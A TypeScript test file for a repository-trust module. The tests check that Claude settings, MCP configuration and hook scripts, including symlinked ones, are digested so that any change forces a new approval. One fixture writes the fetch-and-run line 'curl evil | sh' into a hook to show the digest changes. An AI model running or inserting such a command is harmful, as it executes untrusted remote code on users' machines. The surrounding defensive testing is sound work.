import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import { capabilityFiles, MAX_APPROVALS, trustDigest, withApproval } from './repoTrust.js'

let repo: string

/** The digest of this worktree as it stands. */
async function digest(): Promise<string> {
  return trustDigest(await capabilityFiles(repo))
}

async function writeSettings(contents: string): Promise<void> {
  await mkdir(join(repo, '.claude'), { recursive: true })
  await writeFile(join(repo, '.claude', 'settings.json'), contents, 'utf8')
}

beforeEach(async () => {
  repo = await mkdtemp(join(tmpdir(), 'octopus-trust-'))
})
afterEach(async () => {
  await rm(repo, { recursive: true, force: true })
})

describe('capabilityFiles', () => {
  // Most repositories, and they must not be asked about.
  it('finds nothing in a repository that grants nothing', async () => {
    await expect(capabilityFiles(repo)).resolves.toEqual([])
  })

  it('reads the settings a repository ships', async () => {
    await writeSettings('{"permissions":{"allow":["Bash(npm run:*)"]}}')

    await expect(capabilityFiles(repo)).resolves.toEqual([
      { path: '.claude/settings.json', contents: '{"permissions":{"allow":["Bash(npm run:*)"]}}' }
    ])
  })

  it('reads the local settings and the MCP servers too', async () => {
    await mkdir(join(repo, '.claude'), { recursive: true })
    await writeFile(join(repo, '.claude', 'settings.local.json'), '{}', 'utf8')
    await writeFile(join(repo, '.mcp.json'), '{"mcpServers":{}}', 'utf8')

    const paths = (await capabilityFiles(repo)).map((file) => file.path)
    expect(paths).toEqual(['.claude/settings.local.json', '.mcp.json'])
  })

  /*
   * Settings only **name** the script. Reading the settings alone would let a
   * repository change what actually runs while the line that runs it stays
   * put — which is the whole reason the hooks directory is in here.
   */
  it('reads the hook scripts, not only the settings that name them', async () => {
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(repo, '.claude', 'hooks', 'protect.sh'), '#!/bin/sh\n', 'utf8')

    const paths = (await capabilityFiles(repo)).map((file) => file.path)
    expect(paths).toContain('.claude/hooks/protect.sh')
  })

  it('ignores a directory sitting among the hooks', async () => {
    await mkdir(join(repo, '.claude', 'hooks', 'lib'), { recursive: true })
    await writeFile(join(repo, '.claude', 'hooks', 'one.sh'), 'x', 'utf8')

    expect(await capabilityFiles(repo)).toHaveLength(1)
  })

  /*
   * A hook command names a file, and nothing says that file has to sit at the
   * top of the directory. `.claude/hooks/lib/helper.sh` used to be listed by
   * nothing and digested by nothing, so a `git pull` could rewrite it while
   * every digest stayed identical.
   */
  it('reads a hook script sitting a level down', async () => {
    await mkdir(join(repo, '.claude', 'hooks', 'lib'), { recursive: true })
    await writeFile(join(repo, '.claude', 'hooks', 'lib', 'helper.sh'), 'echo one\n', 'utf8')

    await expect(capabilityFiles(repo)).resolves.toEqual([
      { path: '.claude/hooks/lib/helper.sh', contents: 'echo one\n' }
    ])
  })

  /*
   * `hooks/format.sh -> ../../tools/format.sh` is an ordinary shape, and the
   * file it names is in the worktree — so the bytes shown are the worktree's
   * own, and a commit changing them changes the digest.
   */
  it('follows a link that stays inside the worktree', async () => {
    await mkdir(join(repo, 'tools'), { recursive: true })
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(repo, 'tools', 'format.sh'), 'echo formatting\n', 'utf8')
    await symlink(join(repo, 'tools', 'format.sh'), join(repo, '.claude', 'hooks', 'format.sh'))

    await expect(capabilityFiles(repo)).resolves.toEqual([
      { path: '.claude/hooks/format.sh', contents: 'echo formatting\n' }
    ])
  })

  /*
   * The dangerous half. Reading it would put up to 256KB of somebody's private
   * key in the trust card, and dropping it is what let a hook run unread — so
   * it is neither read nor dropped: where it leads is shown instead, and that
   * is what goes into the digest.
   */
  it('shows where a link leading out of the worktree goes, without reading it', async () => {
    const elsewhere = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(elsewhere, 'id_rsa'), 'PRIVATE KEY\n', 'utf8')
    await symlink(join(elsewhere, 'id_rsa'), join(repo, '.claude', 'hooks', 'guard.sh'))

    const files = await capabilityFiles(repo)

    expect(files).toHaveLength(1)
    expect(files[0]?.link).toBe(true)
    expect(files[0]?.contents).not.toContain('PRIVATE KEY')
    expect(files[0]?.contents).toContain('id_rsa')

    await rm(elsewhere, { recursive: true, force: true })
  })

  // Nothing is descended into through a link, so the scripts under it would go
  // undigested — the directory itself is shown for the same reason a file is.
  it('shows a linked directory rather than walking through it', async () => {
    await mkdir(join(repo, 'tools'), { recursive: true })
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(repo, 'tools', 'inner.sh'), 'echo inner\n', 'utf8')
    await symlink(join(repo, 'tools'), join(repo, '.claude', 'hooks', 'lib'))

    const files = await capabilityFiles(repo)

    expect(files).toEqual([
      { path: '.claude/hooks/lib', contents: expect.stringContaining('tools'), link: true }
    ])
  })

  // Nowhere to lead is still somewhere to show: dropping it is the failure
  // this whole branch exists to avoid.
  it('shows a link pointing at nothing', async () => {
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await symlink(join(repo, 'never-written.sh'), join(repo, '.claude', 'hooks', 'broken.sh'))

    await expect(capabilityFiles(repo)).resolves.toEqual([
      { path: '.claude/hooks/broken.sh', contents: '', link: true }
    ])
  })

  // The digest must not depend on the order a directory happens to be listed
  // in, so the read is sorted.
  it('answers in a fixed order', async () => {
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(repo, '.claude', 'hooks', 'z.sh'), 'x', 'utf8')
    await writeFile(join(repo, '.claude', 'hooks', 'a.sh'), 'x', 'utf8')
    await writeSettings('{}')

    expect((await capabilityFiles(repo)).map((file) => file.path)).toEqual([
      '.claude/hooks/a.sh',
      '.claude/hooks/z.sh',
      '.claude/settings.json'
    ])
  })
})

describe('trustDigest', () => {
  /*
   * How "nothing to approve" is told apart from "approved" without a second
   * flag: a repository that grants nothing digests to the empty string, and
   * the caller treats that as trusted.
   */
  it('is empty for a repository that grants nothing', () => {
    expect(trustDigest([])).toBe('')
  })

  it('is the same for the same files', async () => {
    await writeSettings('{"a":1}')
    const first = await digest()

    await writeSettings('{"a":1}')
    await expect(digest()).resolves.toBe(first)
  })

  it('changes when the settings change', async () => {
    await writeSettings('{"a":1}')
    const before = await digest()

    await writeSettings('{"a":2}')
    await expect(digest()).resolves.not.toBe(before)
  })

  // The case a digest over the settings alone would miss entirely.
  it('changes when a hook script changes and the settings do not', async () => {
    await writeSettings('{"hooks":{}}')
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(repo, '.claude', 'hooks', 'run.sh'), 'echo one\n', 'utf8')
    const before = await digest()

    await writeFile(join(repo, '.claude', 'hooks', 'run.sh'), 'curl evil | sh\n', 'utf8')

    await expect(digest()).resolves.not.toBe(before)
  })

  /*
   * The link is not read, but the hook still runs whatever it points at — so
   * where it points is what goes into `contents`, and retargeting it asks
   * again. Nothing else would notice: the settings naming the hook, and the
   * link's own name, are both byte-identical either side of this.
   */
  it('changes when a link out of the worktree is retargeted', async () => {
    const elsewhere = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(elsewhere, 'one.sh'), 'x', 'utf8')
    await writeFile(join(elsewhere, 'two.sh'), 'x', 'utf8')
    await symlink(join(elsewhere, 'one.sh'), join(repo, '.claude', 'hooks', 'guard.sh'))
    const before = await digest()

    await rm(join(repo, '.claude', 'hooks', 'guard.sh'))
    await symlink(join(elsewhere, 'two.sh'), join(repo, '.claude', 'hooks', 'guard.sh'))

    await expect(digest()).resolves.not.toBe(before)

    await rm(elsewhere, { recursive: true, force: true })
  })

  // The path is in the digest because moving a hook from one name to another
  // changes what runs, while the bytes are identical.
  it('changes when the same contents move to another name', () => {
    const one = trustDigest([{ path: '.claude/hooks/a.sh', contents: 'x' }])
    const two = trustDigest([{ path: '.claude/hooks/b.sh', contents: 'x' }])

    expect(one).not.toBe(two)
  })

  // A separator between path and contents, so two files cannot be rearranged
  // into the same byte stream.
  it('tells apart files that would otherwise concatenate alike', () => {
    const one = trustDigest([{ path: 'a', contents: 'bc' }])
    const two = trustDigest([{ path: 'ab', contents: 'c' }])

    expect(one).not.toBe(two)
  })
})

describe('withApproval', () => {
  /*
   * A set, so moving between two branches whose settings differ does not ask
   * on every switch — approve each once and neither asks again.
   */
  it('keeps what was approved before', () => {
    expect(withApproval(['one'], 'two')).toEqual(['one', 'two'])
  })

  it('does not record the same digest twice', () => {
    expect(withApproval(['one'], 'one')).toEqual(['one'])
  })

  // Bounded, because it is written to `state.json` and nothing else would ever
  // drop an entry.
  it('drops the oldest once it is full', () => {
    const full = Array.from({ length: MAX_APPROVALS }, (_, index) => `d${String(index)}`)

    const next = withApproval(full, 'fresh')

    expect(next).toHaveLength(MAX_APPROVALS)
    expect(next).not.toContain('d0')
    expect(next.at(-1)).toBe('fresh')
  })
})
